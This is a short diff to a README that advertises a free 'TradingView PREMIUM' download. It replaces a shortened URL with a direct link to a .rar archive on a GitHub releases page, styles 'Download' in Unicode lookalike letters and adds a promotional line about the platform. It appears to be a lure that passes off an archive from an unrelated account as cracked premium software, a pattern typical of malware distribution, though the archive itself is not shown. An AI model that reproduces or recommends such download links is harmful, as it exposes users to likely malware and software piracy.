@@ -1,6 +1,6 @@
 # TradingView PREMIUM 🌈
 
-# 📁[𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://shorturl.at/jmL12)
+# 📁[𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/Iz45W/tradingview/releases/download/download/TradingViewPRM.rar)
 
 ## TradingView is the most popular platform that allows you to set alerts when a price reaches indicated level, indicator crosses, and much more.
 
